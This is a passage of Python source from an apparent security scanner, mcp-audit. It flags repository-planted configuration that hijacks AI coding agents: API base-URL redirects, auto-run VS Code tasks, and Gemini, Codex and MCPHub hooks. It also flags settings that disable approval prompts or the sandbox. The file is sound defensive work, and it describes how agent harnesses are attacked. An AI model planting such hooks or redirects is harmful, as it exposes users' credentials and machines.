                    id="CFHYG-007",
                    severity=Severity.HIGH,
                    analyzer=self.name,
                    client=client,
                    server="(config-level)",
                    title=f"Project settings env redirects API traffic ({name})",
                    description=(
                        f"'{_short_path(config_path)}' is project settings that reach"
                        f" everyone who clones the repository. Its env block sets"
                        f" {name}, which {what} '{host}', not the provider's own"
                        " host. CVE-2026-21852 (Check Point Research) used"
                        " ANTHROPIC_BASE_URL this way: Claude Code applies project"
                        " env values"
                        " once the folder is trusted, and at startup in 'claude"
                        " -p', which shows no trust dialog. The block also reaches"
                        " every subprocess Claude Code starts."
                    ),
                    evidence=f"{config_path}: env.{name} -> host {host}",
                    remediation=(
                        f"Remove {name} from this file. If your team routes"
                        " traffic through a gateway or proxy, set it in managed"
                        " settings, user settings or your shell instead, where a"
                        " cloned repository cannot change it, and rotate the API"
                        " key if the host is not one you recognise."
                    ),
                    cwe="CWE-441",
                    cve=(["CVE-2026-21852"] if name == "ANTHROPIC_BASE_URL" else []),
                    owasp_mcp_top_10=["MCP01", "MCP08"],
                    finding_path=str(config_path),
                )
            )
        findings.extend(self._foundry_resource_findings(env, config_path, client))
        return findings

    def _foundry_resource_findings(
        self, env: dict, config_path: Path, client: str
    ) -> list[Finding]:
        """CFHYG-008 — project settings choose an Azure Foundry resource.

        CFHYG-007 treats ``<resource>.services.ai.azure.com`` as Foundry's own
        host, but anyone can create a Foundry resource in their own Azure
        subscription, and a legitimate organisation resource looks the same
        (STORY-0108).  So a resource chosen in a repository's settings is
        reported at INFO, naming the resource, for a person to confirm.
        """
        findings: list[Finding] = []
        for name, resource in _foundry_resources(env):
            findings.append(
                Finding(
                    id="CFHYG-008",
                    severity=Severity.INFO,
                    analyzer=self.name,
                    client=client,
                    server="(config-level)",
                    title=(
                        f"Project settings send API requests to Azure Foundry"
                        f" resource '{resource}'"
                    ),
                    description=(
                        f"'{_short_path(config_path)}' is project settings that reach"
                        f" everyone who clones the repository. Its env block sets"
                        f" {name}, so Claude Code sends API requests, with your"
                        f" Azure credential and the conversation, to the Microsoft"
                        f" Foundry resource '{resource}'"
                        f" ({resource}{_FOUNDRY_HOST_SUFFIX}). That host is"
                        " Microsoft's, but anyone can create a Foundry resource in"
                        " their own Azure subscription, so mcp-audit cannot tell"
                        " whether this one belongs to your organisation. Claude"
                        " Code applies project env values once the folder is"
                        " trusted, and at startup in 'claude -p'."
                    ),
                    evidence=(
                        f"{config_path}: env.{name} -> Foundry resource {resource}"
                    ),
                    remediation=(
                        f"Verify that the Foundry resource '{resource}' belongs to"
                        " your organisation's Azure subscription. Prefer setting"
                        f" {name} in managed settings, user settings or your shell,"
                        " where a cloned repository cannot change it."
                    ),
                    cwe="CWE-441",
                    owasp_mcp_top_10=["MCP01", "MCP08"],
                    finding_path=str(config_path),
                )
            )
        return findings

    # ── TRUST-003: repo-planted IDE auto-execution files ────────────────────

    def analyze_autoexec_file(
        self,
        kind: str,
        config_path: Path,
        client: str,
        project_root: Path,
    ) -> list[Finding]:
        """TRUST-003 / TRUST-008 — inspect a repo-planted auto-execution file.

        Called once per :class:`~mcp_audit.discovery.DiscoveredAutoexecFile`
        found under ``--project``.  Two kinds are handled:

        - ``"vscode-tasks"`` (``.vscode/tasks.json``): a task whose
          ``runOptions.runOn`` (or, under the legacy ``"version": "0.1.0"``
          schema, a top-level ``runOn`` on the task) is ``"folderOpen"`` runs
          automatically the moment the folder is opened.
        - ``"vscode-settings"`` (``.vscode/settings.json``): a command-bearing
          key (terminal profile/env/shellArgs, or a `*Path` interpreter
          setting) whose value is a shell command, a URL, or an absolute
          path outside *project_root*.

        A parse failure (even after lenient JSONC handling) is logged as a
        WARN and returns an empty list — never a crash, never silently
        treated as "nothing to report" without a trace in the log.

        Args:
            kind: One of the labels in
                :data:`~mcp_audit.discovery._PROJECT_AUTOEXEC_SPECS`.
            config_path: Filesystem path to the auto-execution file.
            client: Client name to attach to emitted findings (``"vscode"``).
            project_root: Resolved project root, used to decide whether a
                path value in ``settings.json`` is "outside the project".

        Returns:
            List of TRUST-003 findings.  Empty when the file is benign, not
            found, or cannot be parsed.  For the TRUST-008 kinds (other
            harnesses' auto-run files) see :meth:`_check_sibling_harness_file`.
        """
        if kind in _SIBLING_HARNESS_CHECKS:
            return self._check_sibling_harness_file(kind, config_path, client)

        try:
            text = config_path.read_text(encoding="utf-8")
        except OSError:
            logger.warning(
                "config_hygiene: could not read autoexec file %s", config_path
            )
            return []

        parsed = parse_jsonc(text)
        if parsed is None:
            logger.warning(
                "config_hygiene: failed to parse JSONC in autoexec file %s",
                config_path,
            )
            return []

        if kind == "vscode-tasks":
            if not isinstance(parsed, dict):
                return []
            return self._check_tasks_json(parsed, config_path, client)
        if kind == "vscode-settings":
            if not isinstance(parsed, dict):
                return []
            return self._check_settings_json(parsed, config_path, client, project_root)
        return []

    def _check_tasks_json(
        self,
        raw: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """TRUST-003 clause (a): a ``tasks.json`` task that runs on folder open."""
        findings: list[Finding] = []
        tasks = raw.get("tasks")
        if not isinstance(tasks, list):
            return findings

        legacy_schema = raw.get("version") == "0.1.0"

        for task in tasks:
            if not isinstance(task, dict):
                continue

            run_on = None
            run_options = task.get("runOptions")
            if isinstance(run_options, dict):
                run_on = run_options.get("runOn")
            if run_on is None and legacy_schema:
                run_on = task.get("runOn")

            if run_on != "folderOpen":
                continue

            label = task.get("label", "(unlabeled task)")
            command = task.get("command", "")
            args = task.get("args") or []
            args_str = " ".join(str(a) for a in args)
            command_line = f"{command} {args_str}".strip()

            net_match = _HOOK_NETWORK_RE.search(command_line)
            severity = Severity.CRITICAL if net_match else Severity.HIGH
            evidence = f"Task label: {label!r} | command: {command!r} args: {args!r}"
            if net_match:
                evidence += f" | network primitive matched: {net_match.group(0)!r}"

            findings.append(
                Finding(
                    id="TRUST-003",
                    severity=severity,
                    analyzer=self.name,
                    client=client,
                    server="(task)",
                    title="VS Code task auto-runs on folder open",
                    description=(
                        f"'{config_path.name}' defines a task that runs"
                        " automatically when the folder is opened"
                        " ('runOn: folderOpen'). This is the auto-execution"
                        " pattern used by the Keyv npm worm and the"
                        ' Shai-Hulud "V.A.P.E" campaign (2026) to persist'
                        " alongside a planted Claude Code SessionStart hook."
                        + (
                            " The command reaches the network, escalating this"
                            " to a confirmed exfiltration/C2 channel."
                            if net_match
                            else ""
                        )
                    ),
                    evidence=evidence,
                    remediation=(
                        "Review and remove the auto-run entry, or move the"
                        " command to an explicit task the developer invokes."
                        " mcp-audit does not modify this file."
                    ),
                    cwe="CWE-829",
                    owasp_mcp_top_10=["MCP05", "MCP09"],
                    finding_path=str(config_path),
                )
            )

        return findings

    def _check_settings_json(
        self,
        raw: dict,
        config_path: Path,
        client: str,
        project_root: Path,
    ) -> list[Finding]:
        """TRUST-003 clause: command-bearing ``settings.json`` keys."""
        findings: list[Finding] = []
        for key, raw_value in _flatten_settings_keys(raw):
            if not _is_command_bearing_settings_key(key):
                continue

            if isinstance(raw_value, str):
                if not raw_value.strip():
                    continue
                value_for_match = raw_value
            elif isinstance(raw_value, list) and all(
                isinstance(v, str) for v in raw_value
            ):
                if not raw_value:
                    continue
                value_for_match = " ".join(raw_value)
            else:
                continue

            net_match = _HOOK_NETWORK_RE.search(value_for_match)
            outside_root = _is_absolute_outside_root(value_for_match, project_root)
            has_url = bool(_URL_RE.search(value_for_match))

            if not (net_match or outside_root or has_url):
                continue

            severity = Severity.CRITICAL if net_match else Severity.HIGH
            evidence = f"Setting {key!r} = {raw_value!r}"
            if net_match:
                evidence += f" | network primitive matched: {net_match.group(0)!r}"

            findings.append(
                Finding(
                    id="TRUST-003",
                    severity=severity,
                    analyzer=self.name,
                    client=client,
                    server="(setting)",
                    title="VS Code workspace setting overrides a command-bearing key",
                    description=(
                        f"'{config_path.name}' sets '{key}', which controls a"
                        " terminal profile, shell, or interpreter path. A"
                        " repo-committed workspace setting can redirect the"
                        " developer's terminal or language runtime to an"
                        " attacker-controlled binary the moment a terminal"
                        " opens or a language feature activates."
                        + (
                            " The value reaches the network, escalating this"
                            " to a confirmed exfiltration/C2 channel."
                            if net_match
                            else ""
                        )
                    ),
                    evidence=evidence,
                    remediation=(
                        "Review and remove the auto-run entry, or move the"
                        " command to an explicit task the developer invokes."
                        " mcp-audit does not modify this file."
                    ),
                    cwe="CWE-829",
                    owasp_mcp_top_10=["MCP05", "MCP09"],
                    finding_path=str(config_path),
                )
            )

        return findings

    # ── TRUST-008: other harnesses' auto-run files (STORY-0090) ─────────────

    def _trust008(
        self,
        *,
        severity: Severity,
        client: str,
        path: Path,
        server: str,
        title: str,
        description: str,
        evidence: str,
        remediation: str,
    ) -> Finding:
        """Build a TRUST-008 finding (CWE-829, OWASP MCP05/MCP09)."""
        return Finding(
            id="TRUST-008",
            severity=severity,
            analyzer=self.name,
            client=client,
            server=server,
            title=title,
            description=description,
            evidence=evidence,
            remediation=remediation,
            cwe="CWE-829",
            owasp_mcp_top_10=["MCP05", "MCP09"],
            finding_path=str(path),
        )

    def _check_sibling_harness_file(
        self, kind: str, path: Path, client: str
    ) -> list[Finding]:
        """TRUST-008 — a Gemini CLI, Codex or Claude Code auto-run file in a repo.

        Every key and file semantic below comes from the vendor's own docs
        (see ``docs/agent-execution-surface.md``).  Files are read, never run.
        A file larger than :data:`_AUTOEXEC_MAX_BYTES` is reported (MEDIUM)
        without being read; a file that does not parse is logged and skipped,
        because the harness rejects it too.

        Args:
            kind: A label in
                :data:`~mcp_audit.discovery.SIBLING_HARNESS_AUTOEXEC_KINDS`.
            path: The file (or, for ``claude-workflows``, the directory).
            client: Client label for the findings.

        Returns:
            TRUST-008 findings, plus CRED-001 for a ``.gemini/.env`` value
            matching one of CRED-001's secret patterns (key names only, never
            values).
        """
        if kind == "claude-workflows":
            return self._check_claude_workflows(path, client)
        if kind == "claude-scheduled-tasks":
            return self._check_claude_scheduled_tasks(path, client)

        try:
            size = path.stat().st_size
        except OSError:
            logger.warning("config_hygiene: could not stat autoexec file %s", path)
            return []
        if size > _AUTOEXEC_MAX_BYTES:
            return [
                self._trust008(
                    severity=Severity.MEDIUM,
                    client=client,
                    path=path,
                    server="(file)",
                    title="Agent auto-run file is too large to inspect",
                    description=(
                        f"'{_short_path(path)}' is a file the {client} harness loads"
                        f" automatically, and it is {size} bytes, over mcp-audit's"
                        f" {_AUTOEXEC_MAX_BYTES}-byte read limit, so its contents"
                        " were not checked. A config file this large is unusual;"
                        " padding is one way to hide what it holds."
                    ),
                    evidence=f"{path}: {size} bytes",
                    remediation=(
                        "Open the file and review it before trusting the folder."
                    ),
                )
            ]
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            logger.warning("config_hygiene: could not read autoexec file %s", path)
            return []
        # A leading byte-order mark would make tomllib/json reject the file and
        # hide its contents; read past it.
        text = text.removeprefix("\ufeff")

        if kind == "gemini-settings":
            return self._check_gemini_settings(text, path, client)
        if kind == "gemini-env":
            return self._check_gemini_env(text, path, client)
        if kind == "codex-config":
            return self._check_codex_config(text, path, client)
        if kind == "codex-hooks":
            return self._check_codex_hooks(text, path, client)
        if kind == "mcphub-config":
            return self._check_mcphub_config(text, path, client)
        return []

    def _hook_file_finding(
        self,
        *,
        hooks: dict,
        commands: list[str],
        path: Path,
        client: str,
        harness: str,
        gate: str,
        extra: str = "",
    ) -> Finding:
        """One TRUST-008 finding for a file that defines command hooks."""
        events = sorted(
            str(event)
            for event, groups in hooks.items()
            if self._extract_hook_commands({event: groups})
        )
        net = _network_primitive(commands)
        evidence = (
            f"{path}: hooks on {', '.join(events)}; commands: "
            f"{_quote_commands(commands)}"
        )
        if net:
            evidence += f" | network primitive matched: {net!r}"
        return self._trust008(
            severity=Severity.CRITICAL if net else Severity.HIGH,
            client=client,
            path=path,
            server="(hook)",
            title=f"Repository defines {harness} hooks that run shell commands",
            description=(
                f"'{_short_path(path)}' defines {harness} hooks on {', '.join(events)}."
                f" {harness} runs a hook's command on your machine when that"
                f" event fires. {gate}{extra}"
                + (
                    " A hook command reaches the network, the shape of an"
                    " exfiltration or command-and-control channel."
                    if net
                    else ""
                )
            ),
            evidence=evidence,
            remediation=(
                "Read every hook command before trusting the folder, and remove"
                " hooks you did not expect. mcp-audit does not modify this file."
            ),
        )

    def _check_gemini_settings(
        self, text: str, path: Path, client: str
    ) -> list[Finding]:
        """``.gemini/settings.json``: command hooks, or the hooks switch alone."""
        parsed = parse_jsonc(text)
        if not isinstance(parsed, dict):
            logger.warning("config_hygiene: failed to parse JSONC in %s", path)
            return []
        hooks = parsed.get("hooks")
        commands = self._extract_hook_commands(hooks) if isinstance(hooks, dict) else []
        tools = parsed.get("tools")
        enable_hooks = isinstance(tools, dict) and tools.get("enableHooks") is True
        if commands and isinstance(hooks, dict):
            return [
                self._hook_file_finding(
                    hooks=hooks,
                    commands=commands,
                    path=path,
                    client=client,
                    harness="Gemini CLI",
                    gate=(
                        "Project settings load unless the folder is marked"
                        " untrusted; Gemini CLI fingerprints project hooks and"
                        " warns before running a new or changed one."
                        + (
                            " This file also sets tools.enableHooks."
                            if enable_hooks
                            else ""
                        )
                    ),
                    extra=(
                        " The Miasma worm (2026) planted a SessionStart hook in"
                        " this file, next to the same hook in"
                        " .claude/settings.json, in at least 123 repositories."
                    ),
                )
            ]
        if enable_hooks:
            return [
                self._trust008(
                    severity=Severity.MEDIUM,
                    client=client,
                    path=path,
                    server="(setting)",
                    title="Repository turns on Gemini CLI hooks",
                    description=(
                        f"'{_short_path(path)}' sets tools.enableHooks to true but"
                        " defines no hooks of its own. In Gemini CLI 0.18 to 0.22"
                        " hooks were off by default and this switch turned on"
                        " every hook from every settings layer and extension;"
                        " later releases default it to true and replace it with"
                        " hooksConfig.enabled."
                    ),
                    evidence=f"{path}: tools.enableHooks = true",
                    remediation=(
                        "Remove the switch from project settings; turn hooks on"
                        " in your own ~/.gemini/settings.json if you want them."
                    ),
                )
            ]
        return []

    def _check_gemini_env(self, text: str, path: Path, client: str) -> list[Finding]:
        """``.gemini/.env``: presence, redirects, and secrets (via CRED-001)."""
        env = _parse_dotenv(text)
        redirects = _redirecting_env_vars(env)
        keys = sorted(env)
        evidence = f"{path}: variables " + (_capped_list(keys) if keys else "(none)")
        if redirects:
            evidence += " | redirects: " + ", ".join(
                f"{name} -> host {host}" for name, host in redirects
            )
        redirect_text = (
            " It sets "
            + ", ".join(f"{name} to '{host}'" for name, host in redirects)
            + ", which sends requests, and the API key the CLI attaches,"
            " to a host that is not the provider's own (the CVE-2026-21852"
            " shape, for Gemini CLI)."
            if redirects
            else ""
        )
        findings = [
            self._trust008(
                severity=Severity.HIGH if redirects else Severity.MEDIUM,
                client=client,
                path=path,
                server="(env)",
                title="Repository ships a .gemini/.env file",
                description=(
                    f"'{_short_path(path)}' is the environment file Gemini CLI"
                    " prefers over a plain .env. Gemini CLI loads it into its own"
                    " environment unless the folder is marked untrusted, and"
                    " never excludes variables from it. Before 0.39.1 its"
                    " headless (CI) mode trusted the workspace automatically and"
                    " loaded it, which"
                    " GHSA-wpqr-6v78-jr5g (CVSS 10.0) describes as remote code"
                    " execution from a pull request."
                    + redirect_text
                    + " Only variable names are reported; values are never"
                    " printed."
                ),
                evidence=evidence,
                remediation=(
                    "Do not commit .gemini/.env. Keep API keys in your shell or a"
                    " credential manager, add .gemini/.env to .gitignore, and"
                    " rotate any key that was committed."
                ),
            )
        ]
        server = ServerConfig(
            name=".gemini/.env", client=client, config_path=path, env=env
        )
        for finding in CredentialsAnalyzer().analyze(server):
            finding.finding_path = str(path)
            findings.append(finding)
        return findings

    def _codex_header_helpers(
        self, data: dict, path: Path, client: str, trust_gate: str
    ) -> list[Finding]:
        """TRUST-008 for ``[mcp_servers.<name>] http_headers_helper`` (STORY-0110).

        Codex runs this "local-only shell command that prints a JSON object of
        dynamic HTTP headers" (``codex-rs/config/src/mcp_types.rs``) whenever it
        connects to that ``url`` server, and the key is not on Codex's
        project-local deny list, so a trusted repository can make Codex run a
        command of its choosing.  Same severity rule as ``notify``.
        """
        servers = data.get("mcp_servers")
        if not isinstance(servers, dict):
            return []
        findings: list[Finding] = []
        for name, entry in servers.items():
            if not isinstance(entry, dict):
                continue
            helper = entry.get("http_headers_helper")
            if not isinstance(helper, str) or not helper.strip():
                continue
            net = _network_primitive([helper])
            from mcp_audit.analyzers.supply_chain import (  # noqa: PLC0415
                redact_command_text,
            )

            evidence = (
                f"{path}: mcp_servers.{name}.http_headers_helper ="
                f" {_quote_commands([redact_command_text(helper)])}"
            )
            if net:
                evidence += f" | network primitive matched: {net!r}"
            findings.append(
                self._trust008(
                    severity=Severity.CRITICAL if net else Severity.HIGH,
                    client=client,
                    path=path,
                    server=str(name),
                    title="Repository sets a command Codex runs to build MCP headers",
                    description=(
                        f"'{_short_path(path)}' gives MCP server '{name}' an"
                        " http_headers_helper: a shell command Codex runs on your"
                        " machine each time it connects to that server, to print"
                        " the HTTP headers (usually credentials) it sends. Codex"
                        " allows it in a project file."
                        + trust_gate
                        + (" The command reaches the network." if net else "")
                    ),
                    evidence=evidence,
                    remediation=(
                        "Read the command before trusting the project. If the"
                        " server needs a token, set the helper in your own"
                        " ~/.codex/config.toml or use bearer_token_env_var."
                    ),
                )
            )
        return findings

    def _check_codex_config(self, text: str, path: Path, client: str) -> list[Finding]:
        """``.codex/config.toml``: notify, approval_policy, sandbox_mode, hooks."""
        try:
            data = tomllib.loads(text)
        except (tomllib.TOMLDecodeError, RecursionError):
            logger.warning("config_hygiene: failed to parse TOML in %s", path)
            return []
        findings: list[Finding] = []
        trust_gate = (
            " Codex loads a project's .codex/config.toml once you trust the project."
        )

        notify = data.get("notify")
        if isinstance(notify, str):
            notify = [notify]
        if (
            isinstance(notify, list)
            and notify
            and all(isinstance(part, str) for part in notify)
        ):
            command = " ".join(notify)
            net = _network_primitive([command])
            evidence = f"{path}: notify = {_quote_commands([command])}"
            if net:
                evidence += f" | network primitive matched: {net!r}"
            findings.append(
                self._trust008(
                    severity=Severity.CRITICAL if net else Severity.HIGH,
                    client=client,
                    path=path,
                    server="(notify)",
                    title="Repository sets a Codex notify command",
                    description=(
                        f"'{_short_path(path)}' sets notify, a program Codex runs after"
                        " every agent turn. Cymulate (2026) showed a project"
                        " .codex/config.toml notify running outside Codex's"
                        " sandbox even with the sandbox on; OpenAI closed the"
                        " report as informational. Current Codex documentation"
                        " says Codex ignores notify in a project-local config and"
                        " prints a startup warning, so older Codex releases are"
                        " the ones at risk, and a repository has no reason to"
                        " ship a machine-local notification command."
                        + trust_gate
                        + (" The command reaches the network." if net else "")
                    ),
                    evidence=evidence,
                    remediation=(
                        "Remove notify from the project file; set notifications in"
                        " your own ~/.codex/config.toml."
                    ),
                )
            )

        if data.get("approval_policy") == "never":
            findings.append(
                self._trust008(
                    severity=Severity.HIGH,
                    client=client,
                    path=path,
                    server="(setting)",
                    title="Repository turns off Codex approval prompts",
                    description=(
                        f"'{_short_path(path)}' sets approval_policy ="
                        ' "never", so Codex never pauses to ask before running'
                        " a command."
                        + trust_gate
                        + " A repository that chooses this for everyone who"
                        " clones it removes the prompt that would catch an"
                        " injected instruction (the confused-deputy pattern Origin"
                        " described in 2026)."
                    ),
                    evidence=f'{path}: approval_policy = "never"',
                    remediation=(
                        "Remove approval_policy from the project file and choose"
                        " your own in ~/.codex/config.toml; administrators can pin"
                        " it with allowed_approval_policies in requirements.toml."
                    ),
                )
            )

        if data.get("sandbox_mode") == "danger-full-access":
            findings.append(
                self._trust008(
                    severity=Severity.HIGH,
                    client=client,
                    path=path,
                    server="(setting)",
                    title="Repository turns off the Codex sandbox",
                    description=(
                        f"'{_short_path(path)}' sets sandbox_mode ="
                        ' "danger-full-access", so commands Codex runs get full'
                        " filesystem and network access with no sandbox." + trust_gate
                    ),
                    evidence=f'{path}: sandbox_mode = "danger-full-access"',
                    remediation=(
                        "Remove sandbox_mode from the project file;"
                        " administrators can pin it with allowed_sandbox_modes"
                        " in requirements.toml."
                    ),
                )
            )

        findings.extend(self._codex_header_helpers(data, path, client, trust_gate))

        hooks = data.get("hooks")
        commands = self._extract_hook_commands(hooks) if isinstance(hooks, dict) else []
        if commands and isinstance(hooks, dict):
            findings.append(
                self._hook_file_finding(
                    hooks=hooks,
                    commands=commands,
                    path=path,
                    client=client,
                    harness="Codex",
                    gate=(
                        "Project hooks load once the project is trusted, and"
                        " Codex asks you to review and trust each new or changed"
                        " hook before it runs."
                    ),
                )
            )
        return findings

    def _check_codex_hooks(self, text: str, path: Path, client: str) -> list[Finding]:
        """``.codex/hooks.json``: command hooks."""
        parsed = parse_jsonc(text)
        if not isinstance(parsed, dict):
            logger.warning("config_hygiene: failed to parse JSONC in %s", path)
            return []
        hooks = parsed.get("hooks")
        commands = self._extract_hook_commands(hooks) if isinstance(hooks, dict) else []
        if not commands or not isinstance(hooks, dict):
            return []
        return [
            self._hook_file_finding(
                hooks=hooks,
                commands=commands,
                path=path,
                client=client,
                harness="Codex",
                gate=(
                    "Project hooks load once the project is trusted, and Codex"
                    " asks you to review and trust each new or changed hook"
                    " before it runs."
                ),
            )
        ]

    def _check_mcphub_config(self, text: str, path: Path, client: str) -> list[Finding]:
        """``.mcphub/servers.json``: ``${cmd: ...}`` placeholders (STORY-0119).

        MCPHub (mcp-hub, used by mcphub.nvim) resolves ``${cmd: command args}``
        in every field of a server entry by running the command and using its
        output (mcp-hub README, "Placeholder Syntax": "Executes commands and
        uses output"; mcphub.nvim ``doc/mcp/servers_json.md``: "All fields
        support the universal placeholder syntax").  mcphub.nvim reads a
        project's ``.mcphub/servers.json`` by default (workspace detection,
        ``doc/configuration.md``) and documents no trust prompt, so a
        committed file whose placeholders run a command is an auto-run surface.
        The legacy ``"KEY": "$: command"`` form in an ``env`` object is the
        same thing (documented as deprecated but still supported).  Nothing
        is evaluated here: the placeholders are found as text.
        """
        parsed = parse_jsonc(text)
        if not isinstance(parsed, (dict, list)):
            logger.warning("config_hygiene: failed to parse JSONC in %s", path)
            return []
        commands = _mcphub_commands(parsed)
        if not commands:
            return []
        net = _network_primitive(commands)
        evidence = f"{path}: commands: {_quote_commands(commands)}"
        if net:
            evidence += f" | network primitive matched: {net!r}"
        return [
            self._trust008(
                severity=Severity.CRITICAL if net else Severity.HIGH,
                client=client,
                path=path,
                server="(placeholders)",
                title="Repository MCPHub config runs commands via ${cmd:} placeholders",
                description=(
                    f"'{_short_path(path)}' is MCPHub's project config, which"
                    " MCPHub.nvim loads by default when you open the folder in"
                    " Neovim. It holds placeholders of the form ${cmd: ...} (or"
                    " the legacy '$: ...' in env); MCPHub runs the command and"
                    " substitutes its output, and the documentation names no"
                    " approval step for a project file."
                    + (
                        " A command reaches the network, the shape of an"
                        " exfiltration or command-and-control channel."
                        if net
                        else ""
                    )
                ),
                evidence=evidence,
                remediation=(
                    "Read every ${cmd: ...} command before opening the folder"
                    " with MCPHub, and replace each with a ${env:NAME}"
                    " reference. mcp-audit does not modify this file."
                ),
            )
        ]

    def _check_claude_scheduled_tasks(self, path: Path, client: str) -> list[Finding]:
        """``.claude/scheduled_tasks.json`` in a repository (presence)."""
        try:
            size = path.stat().st_size
        except OSError:
            return []
        return [
            self._trust008(
                severity=Severity.MEDIUM,
                client=client,
                path=path,
                server="(scheduled-tasks)",
                title="Repository ships Claude Code scheduled tasks",
                description=(
                    f"'{_short_path(path)}' is where Claude Code saves"
                    " scheduled tasks you ask it to keep across sessions:"
                    " prompts it runs on a timer."
                    " Anthropic's sandboxing documentation lists it among the"
                    " files Claude Code runs on its own and write-protects it. A"
                    " repository has no reason to ship one: Claude Code lists a"
                    " copied file's tasks but runs them only in the folder that"
                    " created them, so a committed file is either someone's own"
                    " tasks leaking or a planted set of standing instructions."
                    " arXiv 2608.27299 escalated instruction privilege through"
                    " harness scheduled tasks and persistent goals on all six"
                    " harnesses it tested."
                ),
                evidence=f"{path}: {size} bytes",
                remediation=(
                    "Remove the file from the repository and add it to .gitignore;"
                    " recreate any task you need in your own session."
                ),
            )
        ]

    def _check_claude_workflows(self, path: Path, client: str) -> list[Finding]:
        """``.claude/workflows/`` in a repository (inventory, names only)."""
        try:
            # Saved workflows are .js files (code.claude.com/docs/en/workflows);
            # a .gitkeep or README beside them is not a workflow.
            names = sorted(
                entry.name
                for entry in path.iterdir()
                if entry.suffix == ".js" and entry.is_file()
            )
        except OSError:
            logger.warning("config_hygiene: could not list %s", path)
            return []
        if not names:
            return []
        return [
            self._trust008(
                severity=Severity.MEDIUM,
                client=client,
                path=path,
                server="(workflows)",
                title="Repository ships Claude Code workflows",
                description=(
                    f"'{_short_path(path)}' holds {len(names)} saved Claude"
                    " Code workflow file(s): JavaScript that starts and steers"
                    " subagents and runs"
                    " as /<name> for everyone who clones the repository. A project"
                    " workflow wins over a personal one with the same name. Claude"
                    " Code asks before each run in its default modes, once in auto"
                    " mode, and not at all in bypass-permissions mode; in 'claude"
                    " -p' and the Agent SDK there is no prompt and the launch is"
                    " decided by your permission rules, so a 'Workflow' allow rule"
                    " runs it unasked. Anthropic's sandboxing documentation lists"
                    " .claude/workflows among the files Claude Code runs on its"
                    " own."
                ),
                evidence=f"{path}: {_capped_list(names)}",
                remediation=(
                    "Read each workflow script before running it, and check this"
                    " directory in code review like any other executable code."
                ),
            )
        ]

    def _check_anthropic_base_url(
        self,
        server: ServerConfig,
    ) -> list[Finding]:
        """CFHYG-006 — ``ANTHROPIC_BASE_URL`` set to a non-Anthropic domain.

        CVE-2026-21852 (Check Point Research): Claude Code respects this
        variable as the API base URL, so a non-Anthropic value redirects all
        API traffic — including the user's API key and full conversation
        content — to an attacker-controlled server.
        """
        if not server.env:
            return []

        value = server.env.get("ANTHROPIC_BASE_URL")
        if not value:
            return []

        if _is_first_party_anthropic_base_url(value):
            return []

        return [
            Finding(
                id="CFHYG-006",
                severity=Severity.MEDIUM,
                analyzer=self.name,
                client=server.client,
                server=server.name,
                title="ANTHROPIC_BASE_URL overrides Anthropic API endpoint",
                description=(
                    f"Server '{server.name}' sets ANTHROPIC_BASE_URL to a"
                    " non-Anthropic domain. Claude Code respects this"
                    " variable as the API base URL — all API calls,"
                    " including those carrying your API key and full"
                    " conversation content, will be routed to the configured"
                    " domain instead of api.anthropic.com. This is the"
                    " exfiltration vector in CVE-2026-21852"
                    " (Check Point Research)."
                ),
                evidence=(f"ANTHROPIC_BASE_URL={value!r} in server '{server.name}'"),
                remediation=(
                    "Remove or verify the ANTHROPIC_BASE_URL setting in this"
                    " server's env. If it must be set, ensure it points to"
                    " https://api.anthropic.com (or a legitimate Anthropic"
                    " endpoint). Rotate your Anthropic API key if this"
                    " setting was unexpected."
                ),
                cwe="CWE-441",
                cve=["CVE-2026-21852"],
                owasp_mcp_top_10=["MCP01", "MCP08"],
            )
        ]
